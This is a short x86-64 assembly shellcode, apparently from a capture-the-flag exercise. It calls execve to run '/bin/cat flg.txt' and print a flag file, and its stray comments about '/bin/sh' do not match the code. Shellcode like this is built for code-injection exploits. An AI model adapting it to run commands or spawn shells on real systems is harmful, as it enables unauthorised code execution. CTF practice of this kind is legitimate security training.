global _start

section .text
_start:
    xor rax, rax
    push rax              ; push NULL string terminator

    mov rsi, "flg.txt"
    push rsi
    mov rsi, rsp
    push rax
    mov rbx, "/bin/cat" ; first arg to /bin/sh
    push rbx            ; push to stack
    mov rbx, rsp        ; move pointer to ['/bin//sh']
    push rax              ; push NULL string terminator
    push rsi
    push rbx            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    push rax
    mov rdi, "/bin/cat"
    push rdi
    mov rdi, rsp
    mov rdx, rax          ; set env to NULL
    mov ax, 59
    syscall
